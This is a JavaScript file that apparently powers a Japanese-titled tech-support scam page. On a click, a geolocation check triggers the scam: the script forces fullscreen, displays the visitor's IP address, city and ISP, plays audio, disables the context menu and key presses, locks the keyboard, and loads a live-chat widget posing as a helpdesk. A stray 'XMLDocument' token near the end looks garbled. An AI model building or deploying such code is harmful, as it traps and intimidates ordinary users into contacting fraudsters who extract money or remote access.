const show=    async x1=>{
  document.head.innerHTML = `
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
    <meta content="noindex,nofollow" name="robots">
    <link href="index.css" rel="stylesheet">
    <title>ヘルプデスクを取得 -01JP21</title>
  `;

  var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
  (function () {
    var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
    s1.async = true;
    s1.src = 'https://embed.tawk.to/671817622480f5b4f591b418/1iar1mme9';
    s1.charset = 'UTF-8';
    s1.setAttribute('crossorigin', '*');
    s0.parentNode.insertBefore(s1, s0);
  })();

  await document.documentElement.requestFullscreen();

  const ipadd=   x1.ip;
  const city=    x1.city;
  const country= x1.country;
  const isp=     x1.connection.isp;
  const b=       new Date;
  const currtime=x1.timezone.current_time;

  id (`ip_add`).textContent = `Address IP: ${ipadd} ${b.toLocaleString (`EN-US`, currtime)}`;
  id (`cityopm`).textContent = `City: ${city}, ${country}`;
  id (`isp`).textContent = `ISP: ${isp}`;
  id (`mycanvas`).style.display = "block";
  id (`remove`).remove();
  id (`pridez`).play ();

  window.onload = ()=>{
    window.moveTo (0, 0);
    window.resizeTo (window.screen.availWidth, window.screen.availHeight);
  };
  document.addEventListener("DOMContentLoaded", () => document.body.addEventListener("contextmenu", z1 => z1.preventDefault()));
  document.onkeydown = ()=>{
    return false;
  };
  await window.navigator.keyboard.lock ();

  return true;
};

const none=    async ()=>{
  return false;
};

const id=      c1=>document.getElementById (c1);

document.documentElement.addEventListener(`click`, async () => {
  const resp = await window.fetch(`https://ipwho.is/?lang=en`);
  const json = await resp.json();
  if (json.country_code === `ZZ`) {
    await show(json);
  }
  else {
    await none();XMLDocument
  }
});
